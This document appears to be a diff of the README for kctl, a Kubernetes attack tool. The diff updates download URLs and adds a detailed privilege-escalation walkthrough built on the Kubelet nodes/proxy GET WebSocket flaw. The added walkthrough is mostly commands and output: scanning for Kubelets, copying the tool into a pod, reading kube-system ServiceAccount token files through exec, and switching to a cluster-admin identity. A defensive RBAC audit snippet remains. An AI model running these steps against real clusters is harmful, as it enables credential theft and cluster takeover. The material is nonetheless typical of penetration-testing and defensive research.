@@ -69,12 +69,12 @@
 
 ```bash
 # Linux amd64
-curl -LO https://github.com/kinopio1101/kctl/releases/latest/download/kctl-linux-amd64
+curl -LO https://github.com/kinokopio/kctl/releases/latest/download/kctl-linux-amd64
 chmod +x kctl-linux-amd64
 mv kctl-linux-amd64 /usr/local/bin/kctl
 
 # macOS arm64
-curl -LO https://github.com/kinopio1101/kctl/releases/latest/download/kctl-darwin-arm64
+curl -LO https://github.com/kinokopio/kctl/releases/latest/download/kctl-darwin-arm64
 chmod +x kctl-darwin-arm64
 mv kctl-darwin-arm64 /usr/local/bin/kctl
 ```
@@ -82,7 +82,7 @@ mv kctl-darwin-arm64 /usr/local/bin/kctl
 ### Build from Source
 
 ```bash
-git clone https://github.com/kinopio1101/kctl.git
+git clone https://github.com/kinokopio/kctl.git
 cd kctl
 go build -o kctl ./main/main.go
 ```
@@ -180,6 +180,24 @@ discover 10.0.0.0/24 -p 10250,10255 -c 200
 discover 10.0.0.0/24 --all
 ```
 
+Output example:
+```
+[*] Scanning 10.0.0.0/24:10250 (254 targets, 100 concurrent)
+[========================================] 100% (254/254)
+[*] Validating Kubelet endpoints...
+
++-------------+-------+------------+
+| IP          | PORT  | HEALTH     |
++-------------+-------+------------+
+| 10.0.0.1    | 10250 | /healthz   |
+| 10.0.0.5    | 10250 | /healthz   |
++-------------+-------+------------+
+
+[+] Scan complete in 3.2s: 3 open ports, 2 Kubelet nodes
+[*] Use 'set target <ip>' to select target
+[*] Use 'show kubelets' to view cached results
+```
+
 ### ServiceAccount Operations
 
 ```bash
@@ -250,15 +268,164 @@ pid2pod --pid 1234
 pid2pod --all
 ```
 
+### Typical Workflow
+
+```bash
+# 1. Scan network to discover Kubelet nodes
+kctl [default]> discover 10.0.0.0/24
+
+# 2. Select target
+kctl [default]> set target 10.0.0.5
+
+# 3. Scan SA permissions on all Pods
+kctl [default]> sa scan
+
+# 4. View high-privilege SAs
+kctl [default]> sa list --admin
+
+# 5. Switch to high-privilege SA
+kctl [default]> sa use kube-system/cluster-admin
+
+# 6. View new identity permissions
+kctl [kube-system/cluster-admin ADMIN]> sa info
+
+# 7. Execute commands with new identity
+kctl [kube-system/cluster-admin ADMIN]> exec -it
+```
+
 ## Attack Scenario
 
 ### nodes/proxy Privilege Escalation
 
-The `nodes/proxy GET` permission is commonly granted to monitoring tools (Prometheus, Datadog, Grafana) but can be exploited for RCE.
+#### Background
+
+The `nodes/proxy GET` permission is commonly granted to monitoring tools (Prometheus, Datadog, Grafana) for collecting metrics.
 
 Based on [Graham Helton's research](https://grahamhelton.com/blog/nodes-proxy-rce), due to Kubelet's authorization flaw with WebSocket connections, `nodes/proxy GET` can be used to execute commands in any Pod.
 
-#### Attack Flow
+#### Vulnerability Mechanism
+
+1. WebSocket protocol requires HTTP GET for initial handshake
+2. Kubelet performs authorization check based on initial HTTP method (GET)
+3. After authorization passes, WebSocket connection can access `/exec` endpoint to execute commands
+4. This bypasses the `nodes/proxy CREATE` permission that should be required
+
+#### Privilege Escalation with kctl
+
+##### Scenario Setup
+
+Assume you have access to a Pod whose ServiceAccount has `nodes/proxy GET` permission:
+
+```yaml
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: nodes-proxy-reader
+rules:
+  - apiGroups: [""]
+    resources: ["nodes/proxy"]
+    verbs: ["get"]
+```
+
+##### Step 1: Enter Console and Check Permissions
+
+```bash
+# Copy kctl to target Pod
+kubectl cp kctl-linux-amd64 attacker:/kctl
+
+# Enter Pod
+kubectl exec -it attacker -- /bin/sh
+
+# Run kctl
+/kctl console
+```
+
+```
+[*] Auto-connecting to Kubelet 10.244.1.1:10250...
+✓ Connected successfully
+[+] Using ServiceAccount: default/attacker
+[*] Checking permissions...
+[+] Risk Level: HIGH
+
+kctl [default/attacker HIGH]>
+```
+
+##### Step 2: View Current Permissions
+
+```
+kctl [default/attacker HIGH]> sa info
+
+  ServiceAccount Information
+  ─────────────────────────────────────────
+  Name            : attacker
+  Namespace       : default
+  Risk Level      : HIGH
+  Token Status    : Valid
+
+  Permissions:
+    - nodes/proxy:get        <- Key permission!
+    - nodes:list
+    - pods:list
+```
+
+##### Step 3: Scan All Pods on the Node
+
+```
+kctl [default/attacker HIGH]> sa scan
+
+[*] Scanning ServiceAccount tokens...
+[*] Found 15 pods with SA tokens
+[*] Checking permissions... (3 concurrent)
+
+RISK     NAMESPACE      POD                    SERVICE ACCOUNT      TOKEN    FLAGS
+─────────────────────────────────────────────────────────────────────────────────
+ADMIN    kube-system    kube-proxy-xxxxx       kube-proxy           Valid    -
+ADMIN    kube-system    coredns-xxxxx          coredns              Valid    -
+HIGH     monitoring     prometheus-xxxxx       prometheus           Valid    -
+...
+
+[+] Scan complete: 15 SAs, 2 ADMIN, 1 CRITICAL, 3 HIGH
+```
+
+##### Step 4: Execute Commands via nodes/proxy
+
+Since we have `nodes/proxy GET` permission, we can execute commands in any Pod via Kubelet API:
+
+```
+kctl [default/attacker HIGH]> pods
+
+NAMESPACE      POD                         STATUS    CONTAINERS
+───────────────────────────────────────────────────────────────
+kube-system    etcd-master                 Running   etcd
+kube-system    kube-apiserver-master       Running   kube-apiserver
+kube-system    kube-proxy-xxxxx            Running   kube-proxy
+default        nginx                       Running   nginx
+...
+```
+
+```
+kctl [default/attacker HIGH]> exec -n kube-system kube-proxy-xxxxx -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+This returns the `kube-proxy` ServiceAccount token, which typically has cluster-admin privileges!
+
+##### Step 5: Switch to High-Privilege Identity
+
+```
+kctl [default/attacker HIGH]> sa use kube-system/kube-proxy
+
+[+] Switched to kube-system/kube-proxy
+[*] Checking permissions...
+[!] Risk Level: ADMIN (cluster-admin)
+
+kctl [kube-system/kube-proxy ADMIN]>
+```
+
+##### Step 6: Full Cluster Control
+
+Now you have cluster-admin privileges and can fully control the cluster with this token.
+
+#### Attack Flow Diagram
 
 ```
 ┌─────────────────────────────────────────────────────────────────┐
@@ -281,32 +448,6 @@ Based on [Graham Helton's research](https://grahamhelton.com/blog/nodes-proxy-rc
 │ cluster-admin│     │ Use high-    │     │ SA tokens            │
 │ access       │     │ priv token   │     │                      │
 └──────────────┘     └──────────────┘     └──────────────────────┘
-```
-
-#### Step-by-Step
-
-```bash
-# 1. Copy kctl to target Pod
-kubectl cp kctl-linux-amd64 attacker:/kctl
-
-# 2. Enter Pod and run kctl
-kubectl exec -it attacker -- /bin/sh
-/kctl console
-
-# 3. Scan all SA tokens
-kctl> sa scan
-
-# 4. Find high-privilege SA
-kctl> sa list --admin
-
-# 5. Execute command in system Pod to steal token
-kctl> exec -n kube-system kube-proxy-xxxxx -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
-
-# 6. Switch to high-privilege SA
-kctl> sa use kube-system/kube-proxy
-
-# 7. Now you have cluster-admin!
-kctl [kube-system/kube-proxy ADMIN]>
 ```
 
 ## Risk Levels
@@ -347,30 +488,6 @@ kubectl get clusterrolebindings -o json | jq -r '
     jq -e '.rules[] | select(.resources[] | contains("nodes/proxy"))' >/dev/null && \
     echo "[!] $line"
 done
-```
-
-## Project Structure
-
-```
-kctl/
-├── cmd/
-│   ├── console/            # Console command entry
-│   └── rootCmd.go
-├── internal/
-│   ├── console/            # Interactive console
-│   │   └── commands/       # Console commands
-│   │       └── sa/         # SA subcommands
-│   ├── session/            # Session state management
-│   ├── client/
-│   │   ├── kubelet/        # Kubelet API client
-│   │   └── k8s/            # K8s API client
-│   ├── db/                 # SQLite in-memory database
-│   └── rbac/               # Permission analysis
-├── pkg/
-│   ├── network/            # Network utilities (scanner)
-│   ├── token/              # JWT token parsing
-│   └── types/              # Type definitions
-└── config/                 # Configuration
 ```
 
 ## Disclaimer
